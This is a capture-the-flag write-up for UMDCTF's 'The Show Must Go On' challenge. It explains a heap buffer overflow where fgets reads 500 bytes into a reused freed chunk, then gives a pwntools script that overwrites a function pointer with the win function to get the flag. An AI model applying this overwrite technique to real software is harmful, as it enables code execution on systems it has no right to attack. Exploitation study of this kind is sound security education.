# The Show Must Go On

## Challenge

We are given a statically linked binary with an interactive prompt followed by a menu.

The prompt:

```
Welcome to the comedy club!
We only have the best comedians here!Please help us set up for your act
What is the name of your act?
test_act_name
Your act code is: Main_Act_Is_The_Best
How long do you want the show description to be?
10
Describe the show for us:
a test act
```

The menu:

```
What would you like to do?
+-------------+
|   Actions   |
|-------------|
| Perform Act |
| Switch Act  |
| End Show    |
+-------------|
```

Or

```
What would you like to do?
+-------------+
|   Actions   |
|-------------|
| Perform Act |
| Switch Act  |
| End Show    |
+-------------|
Action: 2
Name of Act: new act
Act Code: [1]    774 segmentation fault (core dumped)  ./theshow
```

- Option 1 makes the menu print a line from a hardcoded set of strings, then exits.
- Option 2 tends to segfault.
- Option 3 exits immediately.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

Let's look at the disassembly for the `setup` function, which runs at the start of the program:

```c
var_38h = 0;
placeholder_6 = (uint64_t)in_stack_ffffffffffffffb8;
_obj.message1 = (undefined8 *)sym.malloc_set(0x50);
_obj.message2 = (undefined8 *)sym.malloc_set(0x60);
_obj.message3 = (undefined8 *)sym.malloc_set(0x80);
puVar1 = _obj.message1;
*_obj.message1 = 0x20656d6f636c6557;
puVar1[1] = 0x6320656874206f74;
puVar1[2] = 0x6c63207964656d6f;
*(undefined4 *)(puVar1 + 3) = 0xa216275;
puVar1 = _obj.message2;
*_obj.message2 = 0x20796c6e6f206557;
puVar1[1] = 0x6568742065766168;
puVar1[2] = 0x6f63207473656220;
puVar1[3] = 0x20736e616964656d;
*(undefined4 *)(puVar1 + 4) = 0x65726568;
*(undefined *)((int64_t)puVar1 + 0x24) = 0x21;
puVar1 = _obj.message3;
*_obj.message3 = 0x6820657361656c50;
puVar1[1] = 0x7320737520706c65;
iVar3 = 0x612072756f792072;
puVar1[2] = 0x6f66207075207465;
puVar1[3] = 0x612072756f792072;
*(undefined4 *)(puVar1 + 4) = 0xa7463;
iVar4 = sym.__printf(arg7, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 0x4bb1e6, 
                        (int64_t)_obj.message1, 0x6f66207075207465, 0x612072756f792072, in_R8, in_R9);
iVar4 = sym.__printf(iVar4, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 0x4bb1e6, 
                        (int64_t)_obj.message2, arg3, iVar3, in_R8, in_R9);
sym.__printf(iVar4, param_2, param_3, param_4, param_5, param_6, param_7, param_8, 0x4bb1e6, (int64_t)_obj.message3
                , arg3_00, iVar3, in_R8, in_R9);
iVar4 = sym.puts("What is the name of your act?");
sym.__isoc99_scanf(iVar4, param_2, param_3, param_4, param_5, param_6, param_7, param_8, (char *)0x4bb1e6, 
                    (int64_t)&var_30h, arg3_01, iVar3, in_R8, in_R9);
_obj.mainAct = sym.malloc_set(0x68);
fcn.004004e0(_obj.mainAct, &var_30h, 0x20);
var_38h = sym.fcrypt((int64_t)"Main_Act_Is_The_Best", (int64_t)"UMD_15_Th3_B35T");
iVar3 = _obj.mainAct + 0x20;
fcn.004004e0(iVar3, var_38h, 0x40);
sym.puts("Your act code is: Main_Act_Is_The_Best");
*(code **)(_obj.mainAct + 0x60) = sym.tellAJoke;
_obj.currentAct = _obj.mainAct;
sym.__free((char *)_obj.message1);
sym.__free((char *)_obj.message3);
iVar4 = sym.puts("How long do you want the show description to be?");
arg2 = &stack0xffffffffffffffbc;
sym.__isoc99_scanf(iVar4, param_2, param_3, param_4, param_5, param_6, param_7, param_8, (char *)0x4bb2a2, 
                    (int64_t)arg2, arg3_02, iVar3, in_R8, in_R9);
_obj.showDescription = (char *)sym.malloc_set((int64_t)((int32_t)(placeholder_6 >> 0x20) + 8));
placeholder_0 = "Describe the show for us:";
sym.puts("Describe the show for us:");
sym.getchar(placeholder_0, arg2, placeholder_2, iVar3, in_R8, in_R9, placeholder_6, var_38h, var_30h, iStack48);
sym.fgets(_obj.showDescription, 500, _obj.stdin);
_obj.actList = _obj.mainAct;
```

Notice that, with the last call to `fgets`, we are reading 500 characters into `_obj.showDescription`, regardless of what size we request.
This can lead to a heap buffer overflow, as we can request a size smaller than 500 and still send 500 characters.
This is more clear in the disassembly:

```asm
0x0040125e      bf58b34b00     mov edi, str.How_long_do_you_want_the_show_description_to_be_ ; 0x4bb358 ; "How long do you want the show description to be?" ; const char *s
0x00401263      e8a8720100     call sym.puts               ; int puts(const char *s)
0x00401268      488d45c4       lea rax, [var_3ch]
0x0040126c      4889c6         mov rsi, rax
0x0040126f      bfa2b24b00     mov edi, 0x4bb2a2           ; "%d" ; const char *format
0x00401274      b800000000     mov eax, 0
0x00401279      e8d25d0100     call sym.__isoc99_scanf     ; int scanf(const char *format)
0x0040127e      8b45c4         mov eax, dword [var_3ch]
0x00401281      83c008         add eax, 8
0x00401284      4898           cdqe
0x00401286      4889c7         mov rdi, rax                ; int64_t arg1
0x00401289      e844faffff     call sym.malloc_set
0x0040128e      4889055b722e.  mov qword [obj.showDescription], rax ; [0x6e84f0:8]=0
0x00401295      bf89b34b00     mov edi, str.Describe_the_show_for_us: ; 0x4bb389 ; "Describe the show for us:" ; const char *s
0x0040129a      e871720100     call sym.puts               ; int puts(const char *s)
0x0040129f      e84c900100     call sym.getchar            ; int getchar(void)
0x004012a4      488b15fd552e.  mov rdx, qword [obj.stdin]  ; obj._IO_stdin
                                                            ; [0x6e68a8:8]=0x6e6680 obj._IO_2_1_stdin_ ; FILE *stream
0x004012ab      488b053e722e.  mov rax, qword [obj.showDescription] ; [0x6e84f0:8]=0
0x004012b2      bef4010000     mov esi, 0x1f4              ; 500 ; int size
0x004012b7      4889c7         mov rdi, rax                ; char *s
0x004012ba      e8c1690100     call sym.fgets              ; char *fgets(char *s, int size, FILE *stream)
```

Also note that, at the start of the function, the challenge mallocs 3 buffers of size 0x50, 0x60, and 0x80 to store the prompt dialogues.
These are freed before it reads the show description.
By requesting one of these sizes from malloc, we can make the program reuse one if these buffers, which will place our description before the `_obj.mainAct` struct on the heap.
This will allow us to overwrite the values in the struct with anything we want.

Let's look at what we can do with this in the `whatToDo` function:

```c
sym.puts("What would you like to do?");
var_10h._0_4_ = 0;
var_10h._4_4_ = 0;
sym.puts((char *)0x4bb229);
sym.puts("|   Actions   |");
sym.puts((char *)0x4bb249);
sym.puts("| Perform Act |");
sym.puts("| Switch Act  |");
sym.puts("| End Show    |");
iVar2 = sym.puts("+-------------|");
iVar2 = sym.__printf(iVar2, param_2, param_3, param_4, param_5, param_6, param_7, param_8, (int64_t)"Action: ", 
                        param_10, arg3, param_12, param_13, param_14);
sym.__isoc99_scanf(iVar2, param_2, param_3, param_4, param_5, param_6, param_7, param_8, (char *)0x4bb2a2, 
                    (int64_t)&var_10h, arg3_00, param_12, param_13, param_14);
if ((int32_t)var_10h == 2) {
    sym.switchAct();
    sym.puts("I think the current act switched switched. It might appear when we start up again...");
}
else {
    if ((int32_t)var_10h == 3) {
        var_10h._4_4_ = 1;
    }
    else {
        if ((int32_t)var_10h == 1) {
            (**(code **)(_obj.currentAct + 0x60))();
        }
    }
}
```

Notice that the "Perform Act" action calls a function pointer at `_obj.currentAct + 0x60`.
Note that `_obj.currentAct` is set to `_obj.mainAct` in the setup function.
By overwriting this function pointer with the address of the `win` function, we can make the program call this function and print the flag instead.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0.cloud.chals.io --port 30138 theshow
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('theshow')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 30138)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendlineafter(b"What is the name of your act?\n", b"a")
io.sendlineafter(b"How long do you want the show description to be?\n", str(0x80).encode())
io.sendlineafter(b"Describe the show for us:\n", flat({0xf0: exe.sym['win']}))
io.sendlineafter(b"Action: ", b"1")

io.interactive()
```

## Flag

```
UMDCTF{b1ns_cAN_B3_5up3r_f4st}
```
